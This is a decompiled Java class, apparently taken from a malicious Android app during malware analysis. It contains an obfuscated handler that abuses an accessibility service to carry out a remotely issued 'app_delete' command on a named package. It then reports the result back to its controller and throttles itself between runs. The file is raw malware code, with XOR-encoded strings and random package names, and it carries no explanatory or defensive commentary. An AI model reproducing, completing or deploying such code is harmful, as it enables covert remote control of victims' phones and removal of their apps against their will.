package com.zjxyxnvvp.nxvxchltf.i;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.ioNWOADnaoidWNaod;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class b {
    private static short[] $ = {5763, 5778, 5778, 5821, 5766, 5767, 5774, 5767, 5782, 5767, 1710, 1727, 1725, 1717, 1727, 1721, 1723, 6747, 6732, 6746, 6748, 6725, 6749, 8166, 8129, 8155, 8138, 8129, 8155, 8079, 8142, 8140, 8155, 8134, 8153, 8134, 8155, 8150, 8079, 8135, 8142, 8156, 8079, 8141, 8138, 8138, 8129, 8079, 8131, 8142, 8154, 8129, 8140, 8135, 8138, 8139, 8079, 8137, 8128, 8157, 8079, 8155, 8135, 8134, 8156};

    /* renamed from: a  reason: collision with root package name */
    static boolean f322a;

    /* renamed from: b  reason: collision with root package name */
    static long f323b;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        p pVar = d.e.c;
        f b2 = pVar.b($(0, 10, 5858));
        if (!UIDNwaidobaWIODb.k) {
            long currentTimeMillis = System.currentTimeMillis();
            if (b2 != null && !b2.c()) {
                if (!f322a || currentTimeMillis - f323b > 7000) {
                    try {
                        String optString = b2.a().optString($(10, 17, 1758));
                        if (optString.length() > 0) {
                            ioNWOADnaoidWNaod.f341a = optString;
                            accessibilityService.startActivity(new Intent(accessibilityService, ioNWOADnaoidWNaod.class).addFlags(268435456).addFlags(1073741824));
                        }
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put($(17, 23, 6697), $(23, 65, 8111));
                        pVar.e(b2.b(), jSONObject);
                        f322a = true;
                        f323b = currentTimeMillis;
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}
